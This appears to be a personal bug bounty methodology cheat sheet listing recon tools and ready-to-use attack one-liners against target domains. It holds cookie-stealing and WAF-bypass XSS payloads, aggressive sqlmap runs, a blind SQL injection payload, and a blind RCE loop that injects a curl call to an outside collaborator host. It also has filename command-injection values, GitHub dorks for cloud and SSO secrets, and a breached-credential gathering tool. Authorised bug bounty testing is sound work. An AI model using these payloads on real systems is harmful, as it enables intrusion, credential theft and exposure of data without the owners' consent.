---
description: 'description: For Personal Reference'
---

# 🧑🏫 My Methodologies

* https://github.com/maurosoria/dirsearch
* https://github.com/MobSF/Mobile-Security-Framework-MobSF
* https://github.com/DanMcInerney/xsscrapy
* Burp Suite
* SecLists
* whatcms
* Striker
* OWASP ZAP
* Dirb
* Scrapy
* Dirbuster
* Gobuster
* Wfuzz
* CyberChef
* Sublist3r
* Massdns
* Dnsenum
* Knockpy
* nmap
* Masscan
* Sn1per
* XSStrike
* Sqlmap
* Wpscan
* Joomscan
* CMSmap
* Builtwith
* Wappalyzer
* wafw00f
* passive hunter
* a-mass
* subfinder
* httpx
* aquatone
* dalfox
* nuclei
* open redirect x
* massdns
* paramspider

#### Gathering Breached Credentials

* [https://github.com/hmaverickadams/breach-parse](https://github.com/hmaverickadams/breach-parse)

#### file upload vulnerability test

* [https://github.com/epinna/weevely3](https://github.com/epinna/weevely3)

#### XSS recon methodology

▶ cat domains.txt | waybackurls > urls

```
cat urls.txt        --> read the file
| kxss              --> filter special characters
| sed 's/=.*/=/'    --> remove everything after = ,add = 
| sed 's/URL: //'   --> remove URL: and white space
| dalfox pipe       --> dalfox tool for xss payload
-b xalgord.xss.ht   --> BXSS payload adder.
```

#### KXSS

The vulnerable parameter for XSS should have Unfiltered : **\[“ ‘ < > $ | ( ) \` : ; { } ]**

**Payload:**

```
"><img%20src=x%20onerror="alert(%27POC%20By%20Xalgord%27)"
```

**Bypass Waf Pyaload:**

```
<%2FScriPt><sCripT+class%3DXalgord>document.write(document.cookie);<%2FsCriPt>
```

#### Open Redirect Mass Hunt

* tool = ragno, qsreplace

```
python3 ragno.py -d intensedebate.com -s -q -o ragno_urls.txt
```

```
cat ragno_urls.txt | grep -a -i \=http | wc -w
```

```
cat ragno_urls.txt | grep -a -i \=http > potential_openredirect_vun.txt
```

```
cat potential_openredirect_vun.txt | qsreplace "http://evil.com" | wc -w
```

```
cat potential_openredirect_vun.txt | qsreplace "http://evil.com" > unique_potential_openredirect.txt
```

```
cat unique_potential_openredirect.txt | while read target_urls do; do curl -s -L $target_urls -I | grep "evil.com" && echo "[Vulnerable] $target_urls \n"; done
```

* Example: One Liner for Hunting Mass Open Redirect

```
python3 ragno.py -d test.vulnweb.com -s -q -o ragno_urls.txt | cat ragno_urls.txt | grep -a -i \=http | qsreplace "http://evil.com" | while read target_url do; do curl -s -L $target_url -I | grep "evil.com" && echo "[+] [Vulnerable] $target_url \n"; done

```

#### Amass Command

```
amass enum -brute -o output.txt -d example.com -v
```

#### Detect Low Hanging Bugs and Sensitive Information like API Keys, Secrets etc. including JS Files and HTML Pages

First run Amass Scan and save its output and then run Sublist3r with bruteforce mode and also save its output in different file. Now open a Website such as https://www.textfixer.com/tools/remove-duplicate-lines.php to remove duplicate subdomains.

Tool: https://github.com/BitTheByte/Eagle

Basic Usage:

```
python3 main.py -f domains.txt
```

Advanced Usage:

```
python3 main.py -f domains.txt -w 10 --db output.db.json
```

To check API keys if they vulnerable or not, use a tool such as gmapsapiscanner, it is usefull to save the time by automating the process and also if it gets any Vulnerable API, it will generate its POC itself.

Tool: https://github.com/ozguralp/gmapsapiscanner

Usage:

```
python3 maps_api_scanner_python3.py
```

#### SQL Injection Methodologies

\*try login with admin admin and send login request to burp

\*do an active scan

if show SQL injection with parameter

\#POC

copy request in txt

and on sqlmap

```
sqlmap -r sql.txt --force-ssl --level 5 --risk 3 --dbs -p parameter
```

and you have a valid SQL INJ 😎😎

#### Blind SQL Injection payload:

```
email=test@gmail.com'XOR(if(now()=sysdate(),sleep(5*1),0))XOR'Z
```

#### Reflected XSS On private program

1-

```
amass enum -passive -norecursive -noalts -d domain .com -o domain.txt
```

2-

```
cat domain.txt | httpx -o domainhttpx.txt
```

3-

```
cat domainhttpx.txt | nuclei -t /home/xalgord/nuclei-templates
```

DONE 😎

#### Find SQL injections (command combo)

```
subfinder -d target.com | tee -a domains
cat domains | httpx | tee -a urls.alive
cat urls.alive | waybackurls | tee -a urls.check
gf sqli urls.check >> urls.sqli
sqlmap -m urls.sqli --dbs --batch
```

Here’s what’s going on in detail:

1. First we will find all subdomains under our target domain.
2. Next we will identify all alive web servers running on those subdomains.
3. Waybackurls will fetch all URLs that the Wayback Machine knows about the identified alive subdomains.
4. Now we will filter out URLs that match patterns with potential SQL injection.
5. The final step is to run sqlmap on all identified potentially vulnerable URLs and let it do its magic.

Protip: If you need to bypass WAF (Web Application Firewall) in the process, add the following options to sqlmap:

```
--level=5 --risk=3 -p 'item1' --tamper=apostrophemask,apostrophenullencode,appendnullbyte,base64encode,between,bluecoat,chardoubleencode,charencode,charunicodeencode,concat2concatws,equaltolike,greatest,ifnull2ifisnull,modsecurityversioned
```

#### Get scope of Bugcrowd programs in CLI

There is a new tool in town called bcscope which can get you the scope of all bug bounty programs available on Bugcrowd platform, including the private ones.

All you have to do is to provide your Bugcrowd token like this:

```
bcscope -t <YOUR-TOKEN-HERE> -c 2 -p
```

![alt text](https://www.infosecmatter.com/wp-content/uploads/2020/10/list-scope-for-bugcrowd-bug-bounty-programs.jpg)

Quite convenient and pretty useful!

Get the tool here:

* https://github.com/sw33tLie/bcscope

#### Chaining file uploads with other vulns

When testing file upload functionalities in a web application, try setting the filename to the following values:

* ../../../tmp/lol.png —> for path traversal
* sleep(10)-- -.jpg —> for SQL injection
* .jpg/png —> for XSS
* ; sleep 10; —> for command injections

With these payloads, we may trigger additional vulnerabilities.

#### GitHub dorks for AWS, Jira, Okta .. secrets

Here are some useful GitHub dorks shared by @hunter0x7 for identifying sensitive information related to Amazon AWS cloud:

```
org:Target "bucket_name"
org:Target "aws_access_key"
org:Target "aws_secret_key"
org:Target "S3_BUCKET"
org:Target "S3_ACCESS_KEY_ID"
org:Target "S3_SECRET_ACCESS_KEY"
org:Target "S3_ENDPOINT"
org:Target "AWS_ACCESS_KEY_ID"
org:Target "list_aws_accounts"
```

Here’s another list of GitHub dorks shared by @GodfatherOrwa for identifying various other credentials and secrets:

```
"target.com" password or secret
"target.atlassian" password
"target.okta" password
"corp.target" password
"jira.target" password
"target.onelogin" password
target.service-now password
some time only "target"
```

Protip: While you are doing GitHub dorking, try also [GitDorker](https://github.com/obheda12/GitDorker) (made by [@obheda12](https://twitter.com/obheda12)) which automates the whole process and which contains 400+ dorks in total, for easy bug bounty wins.

Detailed information about GitDorker can be found [here](https://medium.com/@obheda12/gitdorker-a-new-tool-for-manual-github-dorking-and-easy-bug-bounty-wins-92a0a0a6b8d5).

Also check related tip [BBT5-8](https://www.infosecmatter.com/bug-bounty-tips-5-aug-17/#8\_github\_dorks\_for\_finding\_secrets).

#### Simple reflected XSS scenario

Here’s an interesting bug bounty write-up leading to a reflected XSS (Cross-Site Scripting by visiting a link).

The author was able to successfully identify and exploit XSS despite the fact that the application was filtering some characters and keywords (possibly protected by WAF).

Here’s what [@\_justYnot](https://twitter.com/\_justYnot) did in detail:

1. Run subfinder -d target.com | httprobe -c 100 > target.txt
2. Run cat target.txt | waybackurls | gf xss | kxss
3. Got a URL which had all the special characters unfiltered and the parameter was callback=
4. Tried some basic XSS payloads but they weren’t working, the site was filtering some keywords in the payload (like script and alert)
5. Then he referred to the [@PortSwigger](https://twitter.com/PortSwigger) XSS cheat sheet ([link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet))
6. After trying some payloads, one payload with event as onbegin worked and XSS executed successfully!
7. Made a good report, sent it to the company last month and got rewarded \$$

This is a perfect example why we should never give up when things get difficult. When you’ve got a lead, you have to keep pushing to get the reward! Here’s list of tools [@\_justYnot](https://twitter.com/\_justYnot) used:

* https://github.com/projectdiscovery/subfinder
* https://github.com/tomnomnom/httprobe
* https://github.com/tomnomnom/waybackurls
* https://github.com/tomnomnom/gf
* https://github.com/1ndianl33t/Gf-Patterns (xss pattern)
* https://github.com/tomnomnom/hacks/tree/master/kxss

#### XSS firewall bypass techniques

Here’s a list of 7 useful techniques on how we can bypass WAF (Web Application Firewall) while exploiting XSS (Cross-Site Scripting) in a web application:

1. Check if the firewall is blocking only lowercase:

```
<sCRipT>alert(1)</sCRiPt>
```

2. Try to break firewall regex with new line (\r\n), aka. CRLF injection:

```
<script>%0d%0aalert(1)</script>
```

3. Try double encoding:

```
%2522
```

4. Testing for recursive filters, if firewall removes the text in bold, we will have clear payload:

```
<scr<script>ipt>alert(1);</scr</script>ipt>
```

5. Injecting anchor tag without whitespaces:

```
<a/href="j&Tab;a&Tab;v&Tab;asc&Tab;ri&Tab;pt:alert&lpar;1&rpar;">
```

6. Try to bypass whitespaces using a bullet:

```
<svg•onload=alert(1)>
```

7. Try to change request method (POST instead of GET):

GET /?q=xss POST /q=xss

8. Try capatalizing alert function:

```
</textarea><img src=x onerror=”var pop=’ALERT(document.cookie);’; eval(pop.toLowerCase());”
```

#### Short XSS Payload:

```
<script/src=//Ǌ.₨></script>
```

#### Hex XSS Payloads:

```
</title><scRipt>alert(0x00C57D)</scRipt>
<iMg src%3dN onerror%3dalert(0x0036A9)>
<iMg src%3dN onerror%3dalert(0x000D98)>
```

### Throw this into EVERY parameter you see

```
'"`><img src=x>${{7*7}}
```

```
'"` =====> SQLi testing
'"` ======> JS inject
'"`> ======> html tag attribute inject
<img src=x> =====> html inject
${{7*7}} ======> CSTI
```

by @theXSSrat

#### Nuclei CVE-2023-24488 Citrix XSS - Easy Bug Bounty

**Command**:\
subfinder -d [target.com](http://target.com/) -silent | nuclei -t http/cves/2023/CVE-2023-24488.yaml\
\
assetfinder [target.com](http://target.com/) | nuclei -t http/cves/2023/CVE-2023-24488.yaml\
\
**Template**: [xss-nuclei-template-cve-2023-24488.yaml.md](xss-nuclei-template-cve-2023-24488.yaml.md "mention")\
\
**Shodan Dork**:\
ssl:[target.com](http://target.com/) title:"Citrix gateway"\
\
**Dork**:\
intitle:"Citrix Gateway" -site:[citrix.com](http://citrix.com/)

#### Some awesome people on twitter

* [@Dark\_Knight](https://twitter.com/\_Dark\_Knight\_)
* [@El3ctr0Byt3s](https://twitter.com/El3ctr0Byt3s)
* [@sw33tLie](https://twitter.com/sw33tLie)
* [@sillydadddy](https://twitter.com/sillydadddy)
* [@manas\_hunter](https://twitter.com/manas\_hunter)
* [@hunter0x7](https://twitter.com/hunter0x7)
* [@GodfatherOrwa](https://twitter.com/GodfatherOrwa)
* [@\_justYnot](https://twitter.com/\_justYnot)
* [@0xAsm0d3us](https://twitter.com/0xAsm0d3us)
* [@sratarun](https://twitter.com/sratarun)
* [@cry\_\_pto](https://twitter.com/cry\_\_pto)
* [@RathiArpeet](https://twitter.com/RathiArpeet)
* [@Alra3ees](https://twitter.com/Alra3ees)
* [@N008x](https://twitter.com/N008x)

#### Find all Subdomains in a Single Shot

```
cat domains.txt | while read url; do dom=$(assetfinder --subs-only $url|tee $url.txt;crobat -s $url|tee -a $url.txt|subfinder -d $url -silent|tee -a $url.txt |cat $url.txt|httprobe|sort -u > final-$url.txt);echo -e "\e[1;33m[-]Working with $url""\e[1;32m\n  -> done File saved. Please check :)""\n";done
```

#### Check all methods on domainlist for Information Disclosure

```
cat domains.txt | httprobe | while read url;do ww=$(for i in "GET" "PUT" "HEAD" "POST" "TRACE" "CONNECT" "OPTIONS";do curl -s -L -I -X $i $url;done|grep HTTP|grep -v '301 '|awk '{ printf "%3d: %s\n", NR, $0 }');echo -e "\e[1;32m$url\e[0m""\n""$ww""\n";done
```

#### Path based xss with different type methods.

1. Inject payload in every path and check xss
2. append fake paramters in every path and check xss vulnerability
3. made poc for you in your terminal

```
cat domains.txt|gau|egrep -v '(.js|.css|.svg|.jpeg|.jpg)'|grep -v '='|while read url; do dir=$(curl -s -L "$url/xss\"><"|egrep -o '(xss"|xss\\")') dir2=$(curl -s -L "$url/?xss\"><"|egrep -o '(xss"|xss\\")') ;echo -e "Target:\e[1;33m $url\e[0m""\n" "\e[1;32m Method1 -> $dir\e[0m [POC: $url/test\"><]""\n""\e[1;32m  Method2 -> $dir2\e[0m [POC: $url/?test\"><]";done | egrep '(Target|xss)'
```

#### Find Blind RCE with automation

```
cat domains.txt|assetfinder --subs-only|httprobe|gau|grep -Ev (.js|.png|.svg|.jpeg)|grep '='|qsreplace -a ' ||curl //burp-collaborator.burpcollaborator.net'|while read url; do rce=$(curl -s $url);echo -e "[RCE-test] $url";done
```

If you get Response of your burp collab! Boom RCE

#### Scan open ports of domain list using masscan

```
cat domains.txt | httpx -ip -silent| awk '{print $2}' | sed -e 's/\[//g' -e 's/\]//g' | tee ips.txt | while read url; do mass=$(sudo masscan --ports 0-65535 $url);echo -e "$url \n $mass";done
```

#### Easy way to find Path based XSS

```
cat domains.txt | gau | egrep -v '(=|.png|.svg|.jpg|.jpeg|.gif|.js|.js|.css)' | while read url; do dir=$(curl -s -L "$url/xss\"><"|grep 'xss"');echo -e "Target:\e[1;33m $url/\"><\e[0m""\n" "\e[1;32m$dir\e[0m";done
```

#### Where to look for Blind XSS

1. Review Forms
2. Contact Us pages
3. Password Field (you never know if the other side doesn't properly handle input and if your password is in view mode)
4. Address fields of e-commerce sites.
5. First or last name field while doing credit card payments
6. Set User-Agent to Blind XSS payload. You can do that easily from a proxy such as Burpsuite. And there are many more cases, but we would encourage you to read some reports to get a perfect knowledge, where other hackers are already applying these techniques and how you can use them in your program

#### Find Google map API keys in JS files & endpoints from Domains & Subdomains.

```
cat urls.txt | assetfinder|gau|egrep -v'(.png|.svg|.gif|.jpg|.jpeg|.txt|.ico|.css|\?|.pdf)'|while read url; do map=$(curl -s $url|grep 'AIza');echo -e "$url -> $map";done
```

#### Find P1 Bug in a minute

**For Checking SSTI Vulnerability..**

```
cat urls.txt |gau -subs|grep '='| egrep -v '(.js|.png|.svg|.gif|.jpg|.jpeg|.txt|.css|.ico)'|qsreplace "ssti{{7*7}}" | while read url;do cur=$(curl -s $url | grep "ssti49"); echo -e "$url -> $cur";done
```

Output: https://example.com/?s=ssti\{{7\*7\}} -> ssti49 --> Means Vulnerable

#### Check sqli Vulnerability in One shot of domains & subdomains

```
cat urls.txt | gau | egrep -v '(.js|.png|.svg|.gif|.jpg|.jpeg|.txt)' | gf sqli|urlive|tee sqli.txt && sqlmap -m sqli.txt --dbs --batch
```

#### Find xmlrpc in single shot on domain & subdomains.

```
cat domains.txt | assetfinder --subs-only | httprobe| while read url; do xml=$(curl -s -L $url/xmlrpc.php|grep 'XML-RPC');echo -e "$url -> $xml";done | grep 'XML-RPC' |sort -u
```

Output: https://example.com -> XML-RPC server accepts POST requests only

#### JSFScan.sh usage

```
bash JSFScan.sh -l targets.txt --all -r -o filname
```

#### XSS Normal test input

```
"><u>Xalgord</u><marquee onstart='prompt(document.cookie)';>XSS</marquee>
```

***

![Screenshot\_2021-03-16-16-34-20-695\_com google android youtube](https://user-images.githubusercontent.com/48483027/111305580-284b7580-867d-11eb-8704-dee84bb789e9.jpg)

#### Increase XSS vulnerability impact

* [https://hacklido.com/blog/320-how-i-got-a-2000-bounty-with-rxss](https://hacklido.com/blog/320-how-i-got-a-2000-bounty-with-rxss)

#### Mindmaps for Penetration Testing

<figure><img src="https://user-images.githubusercontent.com/48483027/111863466-c68f5200-8981-11eb-9569-38fb5eacf8c9.png" alt=""><figcaption></figcaption></figure>

![assessment-mindset](https://user-images.githubusercontent.com/48483027/111871365-8ba41300-89af-11eb-944f-287a74f48a7f.png)
